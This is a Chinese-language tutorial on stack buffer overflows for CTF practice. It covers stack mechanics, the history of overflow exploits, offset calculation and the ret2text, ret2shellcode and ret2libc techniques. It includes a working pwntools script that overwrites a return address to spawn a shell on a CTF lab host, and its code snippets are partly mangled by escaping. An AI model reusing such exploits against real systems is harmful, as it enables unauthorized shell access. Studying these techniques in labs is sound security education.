# 0x00 栈介绍

栈是一种典型的后进先出 (`Last in First Out`) 的数据结构，其操作主要有压栈 (`push`) 与出栈 (`pop`) 两种操作。

*   程序的栈是从进程地址空间的高地址向低地址增长的。
    
*   `ebp/rbp`是栈帧基址指针寄存器，存放执行函数对应栈帧的栈底地址，用于访问栈中的局部变量和参数。
    
*   `esp/rsp`是堆栈指针寄存器，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶。
    
*   在每次进行`push`操作时会将`esp/rsp`指针减去`4/8`字节，每次进行`pop`操作时会将`esp/rsp`加上`4/8`字节。
    
*   32位下，使用`call`执行函数调用时，先将在栈上的参数传入，再将栈顶保存的`address`作为返回地址，等函数调用结束后返回该地址。
    
*   64位下，使用`call`执行函数调用时，会将栈顶保存的`address`作为返回地址，然后再传入参数。
    
*   64位下`System V AMD64 ABI` (`Linux`、`FreeBSD`、`macOS` 等采用) 中前六个整型或指针参数依次保存在 `RDI, RSI, RDX, RCX, R8 和 R9` 寄存器中，如果还有更多的参数的话才会保存在栈上。
    
*   `eax/rax`寄存器用于保存函数返回值，`eax`还用于在执行系统调用时，保存系统调用号。
    
*   函数调用约定一般是从右到左依次入栈，也有特殊情况，可以自己了解。

# 0x01 栈溢出漏洞基本原理

## 简史

`Morris蠕虫`是第一个在互联网中传播的一个利用栈溢出发动攻击的病毒。

该病毒由康乃尔大学学生 罗伯特·泰潘·莫里斯(Robert Tappan Morris)编写，并于1988年11月2日从麻省理工学院传播到网上。

直到1996年，`Aleph1`在世界顶级黑客杂志`Phrack`第49期上公布了关于栈溢出漏洞的文章`Smashing the Stack for Fun and Profit`

1998年，黑客组织`Cult of the Dead Cow`的成员`Dildog`在`Phrack`上公布了`The Tao of Windows Buffer Overflow`提出了`jmp esp/call esp`覆盖返回地址的方法。

1999年，`Dark Spyrit`在`Phrack`第54期上的文章`Win32 Buffer Oveflows Location,exploitation and Prevention`中提出了成熟的`Windows`缓冲区溢出利用技术及防御措施，重点提出利用系统`DLL`中的指令控制程序执行流程的方法。

随后，`David Litcfield`在`BlackHat`大会上做了题目为`defeating the stack based buffer overflow prevention mechanism of microsoft windows 2003 server`的主题演讲，里面提出利用覆盖`SEH`结构来绕过`Cookie`检测。

之后便涌出了各种栈溢出利用技巧，微软也根据不同的利用方法提出不同的防御策略，在溢出的攻击与防御上，一直是一个长期的过程。

## 介绍

栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。

这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，`bss` 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。

此外，我们也不难发现，发生栈溢出的基本前提是

*   程序必须向栈上写入数据。
    
*   写入的数据大小没有被良好地控制。
    

## 危险函数

*   输入`gets`，直接读取一行，忽略'\\x00'`scanf``vscanf`
    
*   输出`sprintf`
    
*   字符串`strcpy`，字符串复制，遇到`\x00`停止`strcat`，字符串拼接，遇到`\x00`停止`bcopy`
    

## 确定填充长度

这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式

*   相对于栈基地址的的索引，可以直接通过查看 `EBP`相对偏移获得
    
*   相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。
    
*   直接地址索引，就相当于直接给定了地址。
    

一般来说，我们会有如下的覆盖需求

*   覆盖函数返回地址，这时候就是直接看 `EBP`即可。
    
*   覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。
    
*   覆盖 `bss` 段某个变量的内容。
    
*   根据现实执行情况，覆盖特定的变量或地址的内容。
    

之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。

# 0x02 `ret2text`

## 原理

`ret2text` 即控制程序执行程序本身已有的的代码 (`.text`)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 `gadgets`)，这就是我们所要说的 `ROP`。

## 环境

*   存在栈溢出漏洞可以利用。
    
*   拥有可以利用的`.text`，也就是代码部分。
    

## 示例

##### ![](../Images/026b79f682f192efe400d9b3eccd1af6.png)

```

int \_\_cdecl main(int argc, const char \*\*argv, const char \*\*envp)
{
  write(1, Hello, World\\n, 0xDuLL);
  return vulnerable\_function(1LL);
}

ssize\_t vulnerable\_function()
{
  char buf\[128\]; // \[rsp+0h\] \[rbp-80h\] BYREF

  return read(0, buf, 0x200uLL);
}

int callsystem()
{
  return system(/bin/sh);
}
```

在`main()`函数中，存在`vulnerable_function(1LL)`函数

`vulnerable_function()`函数中，调用`read()`函数读取了`0x200`个字节，但是该栈帧只有`0x80`个字节大小，存在栈溢出漏洞可以利用

先写入`0x80`个`A`填充`buf`，然后再写入`0x8个`B`覆盖到`rbp（该程序是64位的，地址以8个字节保存，32位的话则是4个字节）

随后再填入`p64(address)`，用`address`覆盖原来的返回地址，使程序跳转到我们想执行的地址，这里填入的是`callsystem()`的地址

该函数执行了`system(/bin/sh);`会给我们一个`shell`，也就是获得了这个靶机的权限

`p64`是`pwntools`模块自动帮我们把字节按照大端排序，机器码在电脑中是以从高位到地位存储的

`0x12345678`会被存储为`\x78\x56\x34\x12`

```
from pwn import \*

io \= remote('node4.buuoj.cn', 27602) \# 建立与靶机的链接

context.log\_level \= 'debug' \# debug调试信息 可以详细对流程进行分析 

callsystem \= 0x00400596 \# callsystem函数地址
offset \= 0x80 \# 填充变量buf需要的偏移量 0x80 = 128

payload \= b'A'\*offset \# 在python3版本中 发送字节需要在字符前面加上b 不然python会无法识别
payload += b'B'\*8 \# 覆盖rbp
payload += p64(callsystem) \# 返回地址指向callsystem

io.sendline(payload) \# 以行为单位发送字节
io.interactive() \# 用来跟靶机进行交互，在获得shell之后使用
```

# 0x03 `ret2shellcode`

## 原理

`ret2shellcode`，即控制程序执行 `shellcode` 代码。`shellcode` 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 `shell`。一般来说，`shellcode` 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。

在栈溢出的基础上，要想执行 `shellcode`，需要对应的 `binary` 在运行时，`shellcode` 所在的区域具有可执行权限。

## 环境

*   `shellcode`区域具有可执行权限，也就是`NX disabled`
    
*   存在栈溢出漏洞可以利用
    

## 示例

![](../Images/78d4cb45b7a736616b768536a85c6148.png)

```

{

  setvbuf(stdout, 0LL, 2, 0LL);
  puts("tell me your name");
  read(0, name, 0x64uLL);
  puts("wow~ nice name!");
  puts("What do you want to say to me?");
  gets(text);
  return 0;
}
```

# 0x05 `ret2libc`

## 原理

`ret2libc`即控制函数的执行`libc`中的函数，通常是返回至某个函数的`plt`处或者函数的具体位置 (即函数对应的`got`表项的内容)。一般情况下，我们会选择执行`system("/bin/sh")`，故而此时我们需要知道`system`函数的地址。

## 环境

*   存在可以泄露`libc`函数
    
*   存在栈溢出漏洞
